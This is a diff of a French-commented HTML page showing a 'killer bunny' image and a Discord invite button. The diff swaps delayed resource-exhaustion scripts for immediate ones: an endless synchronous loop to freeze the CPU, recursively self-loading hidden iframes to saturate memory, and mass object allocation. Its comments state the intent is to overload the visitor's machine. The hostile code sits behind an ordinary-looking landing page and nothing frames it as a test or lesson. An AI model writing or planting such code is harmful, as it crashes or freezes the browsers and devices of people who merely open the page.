@@ -15,6 +15,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            flex-direction: column;
             height: 100vh;
             overflow: hidden;
         }
@@ -76,52 +77,69 @@
                 transform: scale(1.2);
             }
         }
+
+        /* Style du bouton Discord */
+        .discord-button {
+            width: 80px;
+            height: 80px;
+            background-color: #5865F2;
+            border: none;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            box-shadow: 0 0 20px rgba(88, 101, 242, 0.7);
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .discord-button:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 30px rgba(88, 101, 242, 1);
+        }
+
+        .discord-button img {
+            width: 50px;
+            height: 50px;
+        }
     </style>
 </head>
 <body>
+    <!-- Conteneur de l'image principale -->
     <div class="container">
         <div class="glow"></div>
         <img src="https://i.ibb.co/dMK3t7j/4328d00292b082b5f8fa1b648d25b666-removebg-preview.png" 
              alt="Lapin Tueur" class="killer-bunny">
     </div>
 
-    <!-- Boucle Infinie JavaScript pour surcharger le CPU -->
-    <script>
-        setTimeout(function() {
-            let overload = true;
-            const infiniteLoop = () => {
-                if (overload) {
-                    console.log("Boucle Infinie...");
-                    setTimeout(infiniteLoop, 0); // Utilisation d'une pile non bloquante pour éviter un crash immédiat
-                }
-            };
-            infiniteLoop();
-        }, 5000); // Délai de 5 secondes avant de démarrer la boucle infinie
-    </script>
+    <!-- Bouton Discord -->
+    <a href="https://discord.gg/amsUQdUQa7" target="_blank" class="discord-button">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Discord_icon.svg" alt="Discord Logo">
+    </a>
 
-    <!-- Iframes imbriquées à l'infini pour saturer la mémoire -->
-    <iframe id="nestedIframe" src="about:blank" style="display:none;"></iframe>
+    <!-- Scripts JavaScript -->
     <script>
-        setTimeout(function() {
-            const iframe = document.querySelector('#nestedIframe');
-            const nextQueryValue = !location.search ? 1 : Number(location.search.split("?").pop()) + 1;
-            iframe.src = `index.html?${nextQueryValue}`;
-        }, 2000); // Délai pour laisser un peu de temps avant de commencer les iframes imbriquées
-    </script>
+        // Boucle infinie pour surcharger le CPU
+        while (true) {
+            console.log("Boucle Infinie...");
+        }
 
-    <!-- Surcharge mémoire via objets non nettoyés -->
-    <script>
-        setTimeout(function() {
-            let memoryOverload = [];
-            const fillMemory = () => {
-                for (let i = 0; i < 10000; i++) {
-                    memoryOverload.push({});
-                }
-                console.log("Surcharge mémoire...");
-                requestAnimationFrame(fillMemory); // Utilisation de requestAnimationFrame pour éviter un blocage immédiat
-            };
-            fillMemory();
-        }, 8000); // Délai de 8 secondes avant la surcharge mémoire
+        // Iframes imbriquées à l'infini pour saturer la mémoire
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        const nextQueryValue = !location.search ? 1 : Number(location.search.split("?").pop()) + 1;
+        iframe.src = `index.html?${nextQueryValue}`;
+
+        // Surcharge mémoire immédiate
+        let memoryOverload = [];
+        for (let i = 0; i < 100000; i++) {
+            memoryOverload.push({});
+        }
+        console.log("Surcharge mémoire immédiate !");
     </script>
 </body>
 </html>
